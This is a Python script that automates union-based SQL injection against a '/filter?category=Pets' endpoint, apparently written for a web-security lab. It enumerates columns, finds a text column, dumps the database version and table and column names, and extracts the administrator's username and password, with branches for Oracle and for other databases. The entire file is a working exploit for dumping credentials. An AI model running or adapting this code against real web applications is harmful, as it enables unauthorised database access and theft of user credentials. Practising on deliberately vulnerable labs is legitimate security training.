import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re 

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http" : "http://127.0.0.1:8080" , "https" : "http://127.0.0.1:8080"}

def findNumberofCols(url,path):
    for i in range(1,50):
        r = requests.get(url+path+f"' order by {i} -- -",proxies=proxies,verify=False)
        if r.status_code != 200:
            return i -1
    return False

def findStringType(url,path,numofCols,oracle=""):
    payload_list = ["Null"] * numofCols
    for i in range(1,numberofCols):
        payload_list[i-1] = "'a'"
        r = requests.get(url+path+f"'union select {','.join(payload_list)} {oracle} -- -",proxies=proxies,verify=False)
        if r.status_code == 200:
            return payload_list

def dumpVersion(url,path,payloadList,oracle=""):
    versions = ["@@version" , "version()" , "banner"]
    findStringIdx = payloadList.index("'a'")
    for version in versions:
        payloadList[findStringIdx] = version
        r = requests.get(url+path+f"' union select {','.join(payloadList)} {oracle} -- -",proxies=proxies,verify=False)
        if r.status_code == 200:
            soup = BeautifulSoup(r.text,"html.parser")
            dbVersion = soup.find(string=re.compile('(.*ubuntu.* | PostgreSQL.* |Oracle Database.*)'))
            if dbVersion:
                payloadList[findStringIdx] = "'a'"
                return dbVersion
def dumpTable(url,path,payloadList,payload):
    findStringIdx = payloadList.index("'a'")
    payloadList[findStringIdx] = "table_name"
    r = requests.get(url+path+f"' union select {','.join(payloadList)} from {payload}-- -",proxies=proxies,verify=False)
    if r.status_code == 200:
        soup =BeautifulSoup(r.text,"html.parser")
        table = soup.find(string=re.compile("^users\_.*",re.IGNORECASE))
        if table:
            return table
def dumpCols(url,path,payloadList,table_name,payload):
    findStringIdx = payloadList.index("table_name")
    payloadList[findStringIdx] = "column_name"
    r= requests.get(url+path+f"' union select {','.join(payloadList)} from {payload} where table_name='{table_name}'-- -",proxies=proxies,verify=False)
    if r.status_code == 200:
        soup = BeautifulSoup(r.text,"html.parser")
        dbCols = soup.find_all(string=re.compile("(.*username.*|.*password.*)",re.IGNORECASE))
        if dbCols:
            return dbCols
        
def dumpUserandPasswd(url,path,payloadList,dbCols,tablename):
    findStringIdx = payloadList.index("column_name")
    dbCols.insert(1,"':'")
    if sys.argv[2].lower() == 'oracle':
        payloadList[findStringIdx] = f"{'||'.join(dbCols)}"
    else:
        payloadList[findStringIdx] = f"concat({','.join(dbCols)})"
       
    r = requests.get(url+path+f"' union select {','.join(payloadList)} from {tablename} -- -",proxies=proxies,verify=False)
    if r.status_code == 200:
        soup = BeautifulSoup(r.text,"html.parser")
        administrator = soup.find(string=re.compile(".*administrator.*"))
        if administrator:
            return administrator
if __name__ == "__main__":
    try:
        url = sys.argv[1]
        path = "/filter?category=Pets"
        print("[+] DUMPING SQL injection")
        if sys.argv[2].lower() == "oracle":
            numberofCols = findNumberofCols(url,path)
            print(f"[+] Number of Columns => {numberofCols}") 
            stringType = findStringType(url,path,numberofCols,"from dual")
            version = dumpVersion(url,path,stringType,"from v$version")
            print(f"[+] Database version => {version}")
            dbTable = dumpTable(url,path,stringType,"all_tables")
            print(f"[+] Table Name => {dbTable}")
            dbCols = dumpCols(url,path,stringType,dbTable, "all_tab_columns")
            print(f"[+] Columns {dbCols}")
            admin = dumpUserandPasswd(url,path,stringType,dbCols,dbTable)
            print(f"[+] {admin.split(':')[1]} => {admin.split(':')[0]} ")
        else:
            numberofCols = findNumberofCols(url,path)
            print(f"[+] Number of Columns => {numberofCols}") 
            stringType = findStringType(url,path,numberofCols)
            version = dumpVersion(url,path,stringType)
            print(f"[+] Database version => {version}")
            dbTable = dumpTable(url,path,stringType,"information_schema.tables")
            print(f"[+] Table Name => {dbTable}")
            dbCols = dumpCols(url,path,stringType,dbTable, "information_schema.columns")
            print(f"[+] Columns {dbCols}")
            admin = dumpUserandPasswd(url,path,stringType,dbCols,dbTable)
            print(f"[+] {admin.split(':')[0]} => {admin.split(':')[1]} ")
           
    except IndexError:
        print("[-] python3 UnionSQLI.py <url> <db_name>")
        sys.exit()